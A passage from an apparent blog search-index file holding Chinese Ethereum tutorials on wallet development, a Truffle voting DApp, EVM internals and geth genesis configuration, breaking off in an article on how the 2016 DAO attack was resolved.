    <content type="text"><![CDATA[开发钱包相关博客文章索引， 目前只有以太坊，后期加入比特币，EOS等钱包开发文章 以太坊钱包钱包开发相关协议 理解开发HD 钱包涉及的 BIP32、BIP44、BIP39 - 理解钱包开发核心原理和概念 使用 ethers.js 库 开发网页钱包通过开发一个简单的网页，可以快速掌握钱包开发原理。 使用ethers.js开发以太坊Web钱包1 - 创建钱包账号 使用ethers.js开发以太坊Web钱包2 - 账号Keystore文件导入导出 使用ethers.js开发以太坊Web钱包3 - 展示钱包信息及发起签名交易 使用ethers.js开发以太坊Web钱包4 - 发送Token(代币） 如可开发一款以太安卓钱包使用开源登链钱包产品进行介绍，如何完整开发一个钱包产品， 登链钱包还有强大的DApp 浏览器功能。 登链钱包（一款功能强大的以太坊钱包）完全开源 如何开发一款以太坊（安卓）钱包系列1 - 通过助记词创建账号 如何开发一款以太坊（安卓）钱包系列2 - 导入账号及账号管理 如何开发一款以太坊安卓钱包系列3 - 资产信息展示 如何开发一款以太坊安卓钱包系列4 - 获取以太及Token余额 如何开发一款以太坊安卓钱包系列5 - 发送转账交易 如何开发一款以太坊安卓钱包系列6 - 获取账号交易列表 欢迎钱包开发讨论微信群，加微信：xlbxiong 备注：钱包 如果你有开发钱包、DAPP、交易所、公链、人才招聘等需求，也欢迎勾搭Tiny熊（微信：xlbxiong） 加入最专业的区块链问答社区，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>钱包</tag>
        <tag>HD钱包</tag>
        <tag>Web3</tag>
        <tag>ethers.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Truffle开发以太坊投票DAPP]]></title>
    <url>%2F2019%2F04%2F10%2Felection-dapp%2F</url>
    <content type="text"><![CDATA[投票最担心的是暗箱操作、利用区块链的去中心化技术，来实现一个DAPP保证投票公平公正，来看看如何实现，通过本文可以了解到映射mapping 、结构体struct 及事件 event 的使用。 投票需求分及实现效果要实现一个投票DApp，对于合约来说有两个基本需求： 每人（账号）只能投一票； 记录下一共有多少候选人 记录每个候选人的得票数。 在界面上，需要看到每个候选人的得票数， 已经选择投票人进行投票，来看看实现的效果图： 投票合约实现数据存储每人（账号）只能投一票很容易实现，只需要使用一个mapping 来记录每个地址的投票信息 定义一个 mapping 记录投票记录： 1mapping(address =&gt; bool) public voters; 记录候选人及得票数， 我们思考下，如何合约中表示一个候选人，这里我们用一个结构体来表示候选人： 12345struct Candidate &#123; uint id; string name; // 候选人的名字 uint voteCount;&#125; 在Candidate结构体中，用voteCount表示得票数。我们还需要记录下一共有多少个候选人，直觉是保存到一个数组，前端需要候选人列表时，直接把这个数组返回给前端。 基于EVM的限制，外部函数是没法返回动态的内容，更多可阅读Solidity数组，所以这里我们需要使用一个变通的方案。 用一个变量保存一共有多少个候选人uint public candidatesCount，然后定义一个映射： 1mapping(uint =&gt; Candidate) public candidates 通过id作为key访问映射candidates来取候选人。 投票功能实现接下来就是添加功能： 主要是两个功能： 添加候选人及投票。 每添加一个候选人就加入到candidates映射中，同时候选人数量加1，添加候选人addCandidate函数实现为： 1234function addCandidate (string memory _name) private &#123; candidatesCount ++; candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);&#125; 我们在合约创建的时候，就把候选人添加好，在构造函数中，调用addCandidate，构造函数实现如下： 1234constructor () public &#123; addCandidate("Tiny 熊"); addCandidate("Big 熊");&#125; 投票就是在对应的候选人的voteCount加1，同时这个函数需要一个参数即给哪一个候选人投票，另外需要进行一些合法性检查: 候选人是有效的，投票人必须没有投过票，投票vote函数实现如下： 1234567function vote (uint _candidateId) public &#123; require(!voters[msg.sender]); require(_candidateId &gt; 0 &amp;&amp; _candidateId &lt;= candidatesCount); voters[msg.sender] = true; candidates[_candidateId].voteCount ++;&#125; 事件Event为了有更好的前端体验， 在用户投票之后，应该及时的刷新页面， 这就需要用到事件了。 你还可以阅读另外一篇文章：详解 Solidity 事件Event 了解更多事件知识。 先定义一个事件： 1234// voted eventevent votedEvent ( uint indexed _candidateId); 然后在投票vote函数中最后一行加入发出事件： 1emit votedEvent(_candidateId); 合约部分代码编写完了， 订阅小专栏 获取完整源代码。 合约部署为合约Election，添加一个部署脚本： 12345var Election = artifacts.require(&quot;./Election.sol&quot;);module.exports = function(deployer) &#123; deployer.deploy(Election);&#125;; 在部署之前，还需要打开以太坊的模拟节点Ganache，并确保Truffle配置文件truffle.js 链接节点的地址和端口与Ganache 一致。 Ganache 的安装使用可阅读开发、部署第一个DApp如果要部署到以太坊正式网络可阅读用Truffle 开发一个链上记事本 然后运行一下命令进行部署： 1truffle migrate 前端界面有一个html table标签显示候选人列表: 1234567891011&lt;table class="table"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th scope="col"&gt;#&lt;/th&gt; &lt;th scope="col"&gt;候选人&lt;/th&gt; &lt;th scope="col"&gt;得票数&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody id="candidatesResults"&gt; &lt;/tbody&gt;&lt;/table&gt; candidatesResults的内容，需要使用web3.js从合约中读取候选人信息后动态填入。 使用form标签执行投票操作： 123456789&lt;form onSubmit="App.castVote(); return false;"&gt; &lt;div class="form-group"&gt; &lt;label for="candidatesSelect"&gt;选择候选人&lt;/label&gt; &lt;select class="form-control" id="candidatesSelect"&gt; &lt;/select&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-primary"&gt;投票&lt;/button&gt; &lt;hr /&gt;&lt;/form&gt; 合约交互分三个部分： 初始化 web3 及合约 获取候选人填充到前端页面 用户提交投票 初始化 在initWeb3函数中，完成web3的初始化 123456789101112131415161718 initWeb3: async function() &#123; if (window.ethereum) &#123; App.web3Provider = window.ethereum; try &#123; await window.ethereum.enable(); &#125; catch (error) &#123; console.error("User denied account access") &#125; &#125; else if (window.web3) &#123; App.web3Provider = window.web3.currentProvider; &#125; else &#123; App.web3Provider = new Web3.providers.HttpProvider('http://localhost:9545'); &#125; web3 = new Web3(App.web3Provider); return App.initContract();&#125; web3的初始化，调用App.initContract进行合约初始化： 12345678initContract: function() &#123; $.getJSON(&quot;Election.json&quot;, function(election) &#123; App.contracts.Election = TruffleContract(election); App.contracts.Election.setProvider(App.web3Provider); App.listenForEvents(); return App.render(); &#125;); &#125; 监听投票事件123456789listenForEvents: function() &#123; App.contracts.Election.deployed().then(function(instance) &#123; instance.votedEvent(&#123;&#125;, &#123; fromBlock: 0, toBlock: 'latest' &#125;).watch(function(error, event) &#123; App.render(); &#125;); &#125;); &#125; 这里有一份web3.js 监听事件 API文档说明 候选人界面渲染12345678910111213141516171819202122232425262728render: function() &#123; var electionInstance; App.contracts.Election.deployed().then(function(instance) &#123; electionInstance = instance; return electionInstance.candidatesCount(); // ❶ &#125;).then(function(candidatesCount) &#123; var candidatesResults = $("#candidatesResults"); candidatesResults.empty(); var candidatesSelect = $('#candidatesSelect'); candidatesSelect.empty(); for (var i = 1; i &lt;= candidatesCount; i++) &#123; electionInstance.candidates(i).then(function(candidate) &#123; // ❷ var id = candidate[0]; var name = candidate[1]; var voteCount = candidate[2]; // Render candidate Result var candidateTemplate = "&lt;tr&gt;&lt;th&gt;" + id + "&lt;/th&gt;&lt;td&gt;" + name + "&lt;/td&gt;&lt;td&gt;" + voteCount + "&lt;/td&gt;&lt;/tr&gt;" candidatesResults.append(candidateTemplate); // ❸ // Render candidate ballot option var candidateOption = "&lt;option value='" + id + "' &gt;" + name + "&lt;/ option&gt;" candidatesSelect.append(candidateOption); // ❹ &#125;); &#125; &#125; ❶ 获取候选人数量 ❷ 依次获取某一个候选人信息 ❸ 候选人信息写入候选人表格内 ❹ 候选人信息写入投票选项 运行DApp使用以下命令，启动DApp 服务： 1npm run dev 在浏览器打开http://localhost:3000 ， 浏览器的MetaMask 小狐狸插件需要连接到Ganache网络， 因为只有网络一致才可以读取到网络上的合约数据。 如何设置MetaMask 可阅读开发、部署第一个去中心化应用。 本文为保持主干清晰，代码有删减， 完整代码请订阅小专栏查看。 参考文档Truffle 官方文档-中文版 加我微信：xlbxiong 备注：DApp， 加入以太坊DApp开发微信群。 加入知识星球 成长比别人快一点。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
        <category>DApp</category>
      </categories>
      <tags>
        <tag>DApp</tag>
        <tag>Truffle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊 - 深入浅出虚拟机]]></title>
    <url>%2F2019%2F04%2F09%2Feasy-evm%2F</url>
    <content type="text"><![CDATA[创业有三种状态：投机，寻租以及自恋。屌丝程序员发现区块链是快速改变自己阶级命运的神器，一股脑冲进去，这是投机。早期的创业者，初初接触商业，寻求各种社会资源，各种“优惠”，努力实现“旱涝保收”的状态，这是寻租。稳定盈利的创业者会自恋，认为自己无所不能。创业过程会在这三种状态之间徘徊。在每个状态都要理智控制自己的情绪和理智。创业，最美妙的心理历程是以自己可控方式进入自恋的状态，做自己想做的事情，反推现状，寻找破局。 以太坊虚拟机以太坊虚拟机，简称EVM，是用来执行以太坊上的交易的。业务流程如下图： 输入一笔交易，内部会转换成一个Message对象，传入EVM执行。 如果是一笔普通转账交易，那么直接修改StateDB中对应的账户余额即可。如果是智能合约的创建或者调用，则通过EVM中的解释器加载和执行字节码，执行过程中可能会查询或者修改StateDB。 固定油费（Intrinsic Gas）每笔交易过来，不管三七二十一先需要收取一笔固定油费，计算方法如下： 如果你的交易不带额外数据（Payload），比如普通转账，那么需要收取21000的油费。 如果你的交易携带额外数据，那么这部分数据也是需要收费的，具体来说是按字节收费：字节为0的收4块，字节不为0收68块，所以你会看到很多做合约优化的，目的就是减少数据中不为0的字节数量，从而降低油费gas消耗。 生成Contract对象交易会被转换成一个Message对象传入EVM，而EVM则会根据Message生成一个Contract对象以便后续执行： 可以看到，Contract中会根据合约地址，从StateDB中加载对应的代码，后面就可以送入解释器执行了。 另外，执行合约能够消耗的油费有一个上限，就是节点配置的每个区块能够容纳的GasLimit。 送入解释器执行代码跟输入都有了，就可以送入解释器执行了。EVM是基于栈的虚拟机，解释器中需要操作四大组件： PC：类似于CPU中的PC寄存器，指向当前执行的指令 Stack：执行堆栈，位宽为256 bits，最大深度为1024 Memory：内存空间 Gas：油费池，耗光邮费则交易执行失败 具体解释执行的流程参见下图： EVM的每条指令称为一个OpCode，占用一个字节，所以指令集最多不超过256，具体描述参见：https://ethervm.io 。比如下图就是一个示例（PUSH1=0x60, MSTORE=0x52）： 首先PC会从合约代码中读取一个OpCode，然后从一个JumpTable中检索出对应的operation，也就是与其相关联的函数集合。接下来会计算该操作需要消耗的油费，如果油费耗光则执行失败，返回ErrOutOfGas错误。如果油费充足，则调用execute()执行该指令，根据指令类型的不同，会分别对Stack、Memory或者StateDB进行读写操作。 调用合约函数前面分析完了EVM解释执行的主要流程，可能有些同学会问：那么EVM怎么知道交易想调用的是合约里的哪个函数呢？别急，前面提到跟合约代码一起送到解释器里的还有一个Input，而这个Input数据是由交易提供的。 Input数据通常分为两个部分： 前面4个字节被称为“4-byte signature”，是某个函数签名的Keccak哈希值的前4个字节，作为该函数的唯一标识。（可以在该网站查询目前所有的函数签名） 后面跟的就是调用该函数需要提供的参数了，长度不定。 举个例子：我在部署完A合约后，调用add(1)对应的Input数据是 10x87db03b70000000000000000000000000000000000000000000000000000000000000001 而在我们编译智能合约的时候，编译器会自动在生成的字节码的最前面增加一段函数选择逻辑： 首先通过CALLDATALOAD指令将“4-byte signature”压入堆栈中，然后依次跟该合约中包含的函数进行比对，如果匹配则调用JUMPI指令跳入该段代码继续执行。 这么讲可能有点抽象，我们可以看一看上图中的合约对应的反汇编代码就一目了然了： 这里提到了CALLDATALOAD，就顺便讲一下数据加载相关的指令，一共有4种： CALLDATALOAD：把输入数据加载到Stack中 CALLDATACOPY：把输入数据加载到Memory中 CODECOPY：把当前合约代码拷贝到Memory中 EXTCODECOPY：把外部合约代码拷贝到Memory中 最后一个EXTCODECOPY不太常用，一般是为了审计第三方合约的字节码是否符合规范，消耗的gas一般也比较多。这些指令对应的操作如下图所示： 合约调用合约合约内部调用另外一个合约，有4种调用方式： CALL CALLCODE DELEGATECALL STATICALL 后面会专门写篇文章比较它们的异同，这里先以最简单的CALL为例，调用流程如下图所示： 可以看到，调用者把调用参数存储在内存中，然后执行CALL指令。 CALL指令执行时会创建新的Contract对象，并以内存中的调用参数作为其Input。 解释器会为新合约的执行创建新的Stack和Memory，从而不会破环原合约的执行环境。 新合约执行完成后，通过RETURN指令把执行结果写入之前指定的内存地址，然后原合约继续向后执行。 创建合约前面都是讨论的合约调用，那么创建合约的流程时怎么样的呢？ 如果某一笔交易的to地址为nil，则表明该交易是用于创建智能合约的。 首先需要创建合约地址，采用下面的计算公式：Keccak(RLP(call_addr, nonce))[:12]。也就是说，对交易发起人的地址和nonce进行RLP编码，再算出Keccak哈希值，取后20个字节作为该合约的地址。 下一步就是根据合约地址创建对应的stateObject，然后存储交易中包含的合约代码。该合约的所有状态变化会存储在一个storage trie中，最终以Key-Value的形式存储到StateDB中。代码一经存储则无法改变，而storage trie中的内容则是可以通过调用合约进行修改的，比如通过SSTORE指令。 油费计算最后啰嗦一下油费的计算，计算公式基本上是根据以太坊黄皮书中的定义。 当然你可以直接read the fucking code，代码位于core/vm/gas.go和core/vm/gas_table.go中。 合约的四种调用方式在中大型的项目中，我们不可能在一个智能合约中实现所有的功能，而且这样也不利于分工合作。一般情况下，我们会把代码按功能划分到不同的库或者合约中，然后提供接口互相调用。 在Solidity中，如果只是为了代码复用，我们会把公共代码抽出来，部署到一个library中，后面就可以像调用C库、Java库一样使用了。但是library中不允许定义任何storage类型的变量，这就意味着library不能修改合约的状态。如果需要修改合约状态，我们需要部署一个新的合约，这就涉及到合约调用合约的情况。 合约调用合约有下面4种方式： CALL CALLCODE DELEGATECALL STATICCALL CALL vs. CALLCODECALL和CALLCODE的区别在于：代码执行的上下文环境不同。 具体来说，CALL修改的是被调用者的storage，而CALLCODE修改的是调用者的storage。 我们写个合约验证一下我们的理解： 1234567891011121314151617181920pragma solidity ^0.4.25;contract A &#123; int public x; function inc_call(address _contractAddress) public &#123; _contractAddress.call(bytes4(keccak256("inc()"))); &#125; function inc_callcode(address _contractAddress) public &#123; _contractAddress.callcode(bytes4(keccak256("inc()"))); &#125;&#125;contract B &#123; int public x; function inc() public &#123; x++; &#125;&#125; 我们先调用一下inc_call()，然后查询合约A和B中x的值有什么变化： 可以发现，合约B中的x被修改了，而合约A中的x还等于0。 我们再调用一下inc_callcode()试试： 可以发现，这次修改的是合约A中x，合约B中的x保持不变。 CALLCODE vs. DELEGATECALL实际上，可以认为DELEGATECALL是CALLCODE的一个bugfix版本，官方已经不建议使用CALLCODE了。 CALLCODE和DELEGATECALL的区别在于：msg.sender不同。 具体来说，DELEGATECALL会一直使用原始调用者的地址，而CALLCODE不会。 我们还是写一段代码来验证我们的理解： 12345678910111213141516171819202122pragma solidity ^0.4.25;contract A &#123; int public x; function inc_callcode(address _contractAddress) public &#123; _contractAddress.callcode(bytes4(keccak256(&quot;inc()&quot;))); &#125; function inc_delegatecall(address _contractAddress) public &#123; _contractAddress.delegatecall(bytes4(keccak256(&quot;inc()&quot;))); &#125;&#125;contract B &#123; int public x; event senderAddr(address); function inc() public &#123; x++; emit senderAddr(msg.sender); &#125;&#125; 我们首先调用一下inc_callcode()，观察一下log输出： 可以发现，msg.sender指向合约A的地址，而非交易发起者的地址。 我们再调用一下inc_delegatecall()，观察一下log输出： 可以发现，msg.sender指向的是交易的发起者。 STATICCALLSTATICCALL放在这里似乎有滥竽充数之嫌，因为目前Solidity中并没有一个low level API可以直接调用它，仅仅是计划将来在编译器层面把调用view和pure类型的函数编译成STATICCALL指令。 view类型的函数表明其不能修改状态变量，而pure类型的函数则更加严格，连读取状态变量都不允许。 目前是在编译阶段来检查这一点的，如果不符合规定则会出现编译错误。如果将来换成STATICCALL指令，就可以完全在运行时阶段来保证这一点了，你可能会看到一个执行失败的交易。 话不多说，我们就先看看STATICCALL的实现代码吧： 可以看到，解释器增加了一个readOnly属性，STATICCALL会把该属性置为true，如果出现状态变量的写操作，则会返回一个errWriteProtection错误。 总结：以太坊虚拟机用来执行以太坊上的交易，更改以太坊状态。交易分两种：普通交易和智能合约交易。在执行交易时需要支付油费。智能合约之间的调用有四种方式。 作者Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家关注。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊创世区块与链配置载入分析]]></title>
    <url>%2F2019%2F04%2F08%2Fgenesis%2F</url>
    <content type="text"><![CDATA[创世区块作为第零个区块，其他区块直接或间接引用到创世区块。因此节点启动之初必须载入正确的创世区块信息，且不得任意修改。 以太坊允许通过创世配置文件来初始化创世区块，也可使用选择使用内置的多个网络环境的创世配置。默认使用以太坊主网创世配置。 创世配置文件如果你需要搭建以太坊私有链，那么了解创世配置是必须的，否则你大可不关心创世配置。下面是一份 JSON 格式的创世配置示例： 12345678910111213141516171819202122232425262728293031323334&#123; "config": &#123; "chainId": 1, "homesteadBlock": 1150000, "daoForkBlock": 1920000, "daoForkSupport": true, "eip150Block": 2463000, "eip150Hash": "0x2086799aeebeae135c246c65021c82b4e15a2c451340993aacfd2751886514f0", "eip155Block": 2675000, "eip158Block": 2675000, "byzantiumBlock": 4370000, "constantinopleBlock": 7280000, "petersburgBlock": 7280000, "ethash": &#123;&#125; &#125;, "nonce": "0x42", "timestamp": "0x0", "extraData": "0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa", "gasLimit": "0x1388", "difficulty": "0x400000000", "mixHash": "0x0000000000000000000000000000000000000000000000000000000000000000", "coinbase": "0x0000000000000000000000000000000000000000", "number": "0x0", "gasUsed": "0x0", "parentHash": "0x0000000000000000000000000000000000000000000000000000000000000000", "alloc": &#123; "000d836201318ec6899a67540690382780743280": &#123; "balance": "0xad78ebc5ac6200000" &#125;, "001762430ea9c3a26e5749afdb70da5f78ddbb8c": &#123; "balance": "0xad78ebc5ac6200000" &#125; &#125;&#125; 根据配置用途可分为三大类： 链配置config项是定义链配置，会影响共识协议，虽然链配置对创世影响不大，但新区块的出块规则均依赖链配置。 创世区块头信息配置 nonce：随机数，对应创世区块 Nonce 字段。 timestamp：UTC时间戳，对应创世区块 Time字段。 extraData：额外数据，对应创世区块 Extra 字段。 gasLimit：必填，燃料上限，对应创世区块 GasLimit 字段。 difficulty：必填，难度系数，对应创世区块 Difficulty 字段。搭建私有链时，需要根据情况选择合适的难度值，以便调整出块。 minHash：一个哈希值，对应创世区块的MixDigest字段。和 nonce 值一起证明在区块上已经进行了足够的计算。 coinbase：一个地址，对应创世区块的Coinbase字段。 初始账户资产配置alloc 项是创世中初始账户资产配置。在生成创世区块时，将此数据集中的账户资产写入区块中，相当于预挖矿。这对开发测试和私有链非常好用，不需要挖矿就可以直接为任意多个账户分配资产。 自定义创世如果你计划部署以太坊私有网络或者一个独立的测试环境，那么需要自定义创世，并初始化它。为了统一沟通，推荐先在用户根目录创建一个文件夹 deepeth，以做为《以太坊设计与实现》电子书学习工作目录。 1mkdir $HOME/deepeth &amp;&amp; cd $HOME/deepeth 再准备两个以太坊账户，以便在创世时存入资产。 1geth --datadir $HOME/deepeth account new 因为是学习使用，推荐使用统一密码 foobar，执行两次命令，创建好两个账户。这里使用 --datadir 参数指定以太坊运行时数据存放目录，是让大家将数据统一存放在一个本课程学习文件夹中。 再将下面配置内容保存到 $HOME/deepeth/genesis.json 文件，其中 alloc 项替换成刚刚创建的两个以太坊账户地址。 12345678910111213141516171819202122232425262728&#123; "config": &#123; "chainId": 8888, "homesteadBlock": 0, "daoForkBlock": 0, "daoForkSupport": true, "eip150Block": 0, "eip155Block": 0, "eip158Block": 0, "byzantiumBlock": 0, "constantinopleBlock": 0, "petersburgBlock": 0, "ethash": &#123;&#125; &#125;, "nonce": "0x42", "timestamp": "0x0", "extraData": "0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa", "gasLimit": "0x1388", "difficulty": "0x1", "alloc": &#123; "093f59f1d91017d30d8c2caa78feb5beb0d2cfaf": &#123; "balance": "0xffffffffffffffff" &#125;, "ddf7202cbe0aaed1c2d5c4ef05e386501a054406": &#123; "balance": "0xffffffffffffffff" &#125; &#125;&#125; 然后，执行 geth 子命令 init 初始化创世区块。 1geth --datadir $HOME/deepeth init genesis.json 执行成功后，便可启动该私有链： 1geth --maxpeers 0 --datadir $HOME/deepeth console 执行如下命令，可以查看到前面创建的两个账户，均已有资产： 1234eth.getBalance(eth.accounts[0])// 18446744073709551615eth.getBalance(eth.accounts[1])// 18446744073709551615 至此，我们已完成创世定制版。 内置的创世配置上面我已完成自定义创世，但以太坊作为去中心平台，需要许多节点一起参与。仅仅为了测试，多个节点来搭建私有链比较麻烦。如果希望和别人一起联调，或者需要在测试网络中测试DAPP时，该怎么办呢？那么，可使用以太坊测试网络。以太坊公开的测试网络有 5 个，目前仍在运行的有 4 个，具体见下表格。 |测试网|共识机制|出块间隔|提供方|上线时间|备注|状态||—|—|—|—|—|—|—|—|| Morden | PoW || 以太坊官方 |2015.7|因难度炸弹被迫退役 |stopped||Ropsten |PoW |30秒|以太坊官方|2016.11|接替Morden| running||Kovan | PoA | 4秒|以太坊钱包Parity开发团队| 2017.3 |不支持geth| running ||Rinkeby | PoA |15秒| 以太坊官方| 2017.4|最常用，只支持geth | running||Sokol | PoA |5秒| 以太坊官方POA.network团队| 2017.12|不支持geth | running||Görli | PoA | 15秒| 以太坊柏林社区 | 2018.9| 首个以太坊2.0实验场| running| 支持 geth 的3个测试网络的创世配置已内置在以太坊代码中，具体见 core/genesis.go 文件： 123456// DefaultTestnetGenesisBlock returns the Ropsten network genesis block.func DefaultTestnetGenesisBlock() *Genesis&#123;&#125;// DefaultRinkebyGenesisBlock returns the Rinkeby network genesis block.func DefaultRinkebyGenesisBlock() *Genesis// DefaultGoerliGenesisBlock returns the Görli network genesis block.func DefaultGoerliGenesisBlock() *Genesis&#123;&#125; 当然不会缺以太坊主网创世配置，也是 geth 运行的默认配置。 12// DefaultGenesisBlock returns the Ethereum main net genesis block.func DefaultGenesisBlock() *Genesis&#123;&#125; 如果你不想自定义创世配置文件用于开发测试，那么以太坊也提供一份专用于本地开发的配置。 1234// DeveloperGenesisBlock returns the 'geth --dev' genesis block. Note, this must// be seeded with thefunc DeveloperGenesisBlock(period uint64, faucet common.Address) *Genesis 运行 geth --dev console 可临时运行使用。但如果需要长期使用此模式，则需要指定 datadir。 1geth --dev --datadir $HOME/deepeth/dev console 首次运行 dev 模式会自动创建一个空密码的账户，并开启挖矿。当有新交易时，将立刻打包出块。 geth 创世区块加载流程在运行 geth 时需根据配置文件加载创世配置以及创世区块，并校验其合法性。如果配置信息随意变更，易引起共识校验不通过等问题。只有在加载并检查通过时，才能继续运行程序。 上图是一个简要流程，下面分别讲解“加载创世配置”和“安装创世区块”两个子流程。 加载创世配置应使用哪种创世配置，由用户在启动 geth 时决定。下图是创世配置选择流程图：通过 geth 命令参数可选择不同网络配置，可以通过 networkid 选择，也可使用网络名称启用。 使用 networkid: 不同网络使用不同ID标识。 1=Frontier，主网环境，是默认选项。 2=Morden 测试网络，但已禁用。 3=Ropsten 测试网络。 4=Rinkeby 测试网络。 直接使用网络名称： testnet: Ropsten 测试网络。 rinkeby: Rinkeby 测试网络。 goerli: Görli 测试网络。 dev: 本地开发环境。 geth 启动时根据不同参数选择加载不同网络配置，并对应不同网络环境。如果不做任何选择，虽然在此不会做出选择，但在后面流程中会默认使用主网配置。 安装创世区块上面已初步选择创世配置，而这一步则根据配置加载或者初始化创世单元。下图是处理流程： 首先，需要从数据库中根据区块高度 0 读取创世区块哈希。如果不存在则说明本地属于第一次启动，直接使用运行时创世配置来构建创世区块。属于首次，还需要存储创世区块和链配置。 如果存在，则需要使用运行时创世配置构建创世区块并和本次已存储的创世区块哈希进行对比。一旦不一致，则返回错误，不得继续。 随后，还需要检查链配置。先从数据库获取链配置，如果不存在，则无需校验直接使用运行时链配置。否则，需要检查运行时链配置是否正确，只有正确时才能替换更新。但有一个例外：主网配置不得随意更改，由代码控制而非人为指定。 总的来说，以太坊默认使用主网配置，只有在首次运行时才创建和存储创世区块，其他时候仅仅用于校验。而链配置除主网外则在规则下可随时变更。 构建创建区块上面我们已知晓总体流程，这里再细说下以太坊是如何根据创世配置生成创世区块。核心代码位于 core/genesis.go:229。 12345678910111213141516171819202122232425262728293031323334353637383940func (g *Genesis) ToBlock(db ethdb.Database) *types.Block&#123; if db == nil &#123; db = rawdb.NewMemoryDatabase() &#125; statedb, _ := state.New(common.Hash&#123;&#125;, state.NewDatabase(db))//❶ for addr, account := range g.Alloc &#123; //❷ statedb.AddBalance(addr, account.Balance) statedb.SetCode(addr, account.Code) statedb.SetNonce(addr, account.Nonce) for key, value := range account.Storage &#123; statedb.SetState(addr, key, value) &#125; &#125; root := statedb.IntermediateRoot(false)//❸ head := &amp;types.Header&#123;//❹ Number: new(big.Int).SetUint64(g.Number), Nonce: types.EncodeNonce(g.Nonce), Time: g.Timestamp, ParentHash: g.ParentHash, Extra: g.ExtraData, GasLimit: g.GasLimit, GasUsed: g.GasUsed, Difficulty: g.Difficulty, MixDigest: g.Mixhash, Coinbase: g.Coinbase, Root: root, &#125; //❺ if g.GasLimit == 0 &#123; head.GasLimit = params.GenesisGasLimit &#125; if g.Difficulty == nil &#123; head.Difficulty = params.GenesisDifficulty &#125; statedb.Commit(false)//❻ statedb.Database().TrieDB().Commit(root, true)//❼ return types.NewBlock(head, nil, nil, nil)//❽&#125; 上面代码是根据创世配置生成创世区块的代码逻辑，细节如下： ❶ 创世区块无父块，从零初始化全新的 state（后续文章会详细讲解 state对象）。 ❷ 遍历配置中 Alloc 项账户集合数据，直接写入 state 中。 这里不单可以设置 balance，还可以设置 code、nonce 以及任意多个 storage 数据。 意味着创世时便可以直接部署智能合约。例如下面配置则在创世时部署了一个名为093f59f1d91017d30d8c2caa78feb5beb0d2cfaf 的智能合约。 12345678910"alloc": &#123; "093f59f1d91017d30d8c2caa78feb5beb0d2cfaf": &#123; "balance": "0xffffffffffffffff", "nonce": "0x3", "code":"0x606060", "storage":&#123; "11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa":"1234ff" &#125; &#125;&#125; ❸ 将账户数据写入 state 后，便可以计算出 state 数据的默克尔树的根值，称之为 StateRoot。 此值记录在区块头 Root 字段中。 ❹ 创世配置的一部分配置，则直接映射到区块头中，完成创世区块头的构建。 ❺ 因为 GasLimit 和 Difficulty 直接影响到下一个区块出块处理。 因此未设置时使用默认配置(Difficulty=131072，GasLimit=4712388)。 ❻ 提交 state，将 state 数据提交到底层的内存 trie 数据中。 ❼ 将内存 trie 数据更新到 db 中。这是多余的一步，因为提交到数据库是由外部进行，这里只需要负责生成区块。 ❽ 利用区块头创建区块，且区块中无交易记录。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊DAO攻击解决方案代码解析]]></title>
    <url>%2F2019%2F04%2F07%2Fdao%2F</url>
    <content type="text"><![CDATA[虽然 The DAO 攻击发生在2016年，但解除攻击的方案依然值得学习。 区块链本是去中心化架构，在以太坊首次遭遇严重黑客攻击智能合约事件时，采用的解决方案却破坏了去中心化理念。 这里不讨论其是否违背区块链精神，本文重点介绍解决方案的技术实施细节。方案中涉及网络隔离技术和矿工共识投票技术。且只是从软件上处理，未破坏共识协议。解决方案的成功实施，为区块链分叉提供了实操经验，值得公链开发者学习。 什么是 The DAO 攻击简单地讲，在2016年4月30日开始，一个名为“The DAO”的初创团队，在以太坊上通过智能合约进行ICO众筹。28天时间，筹得1.5亿美元，成为历史上最大的众筹项目。 THE DAO创始人之一Stephan TualTual在6月12日宣布，他们发现了软件中存在的“递归调用漏洞”问题。 不幸的是，在程序员修复这一漏洞及其他问题的期间，一个不知名的黑客开始利用这一途径收集THE DAO代币销售中所得的以太币。6月18日，黑客成功挖到超过360万个以太币，并投入到一个DAO子组织中，这个组织和THE DAO有着同样的结构。 THE DAO持有近15%的以太币总数，因此THE DAO这次的问题对以太坊网络及其加密币都产生了负面影响。 6月17日，以太坊基金会的Vitalik Buterin更新一项重要报告，他表示，DAO正在遭到攻击，不过他已经研究出了解决方案： 现在提出了软件分叉解决方案，通过这种软件分叉，任何调用代码或委托调用的交易——借助代码hash0x7278d050619a624f84f51987149ddb439cdaadfba5966f7cfaea7ad44340a4ba（也就是DAO和子DAO）来减少账户余额——都会视为无效…… 最终因为社交的不同意见，最终以太坊分裂出支持继续维持原状的以太经典 ETC，同意软件分叉解决方案的在以太坊当前网络实施。 以上内容整理自文章The DAO 攻击。 解决方案因为投资者已经将以太币投入了 The DAO 合约或者其子合约中，在攻击后无法立刻撤回。需要让投资者快速撤回投资，且能封锁黑客转移资产。 V神公布的解决方案是，在程序中植入转移合约以太币代码，让矿工选择是否支持分叉。在分叉点到达时则将 The DAO 和其子合约中的以太币转移到一个新的安全的可取款合约中。全部转移后，原投资者则可以直接从取款合约中快速的拿回以太币。取款合约在讨论方案时，已经部署到主网。合约地址是0xbf4ed7b27f1d666546e30d74d50d173d20bca754。 取款合约代码如下： 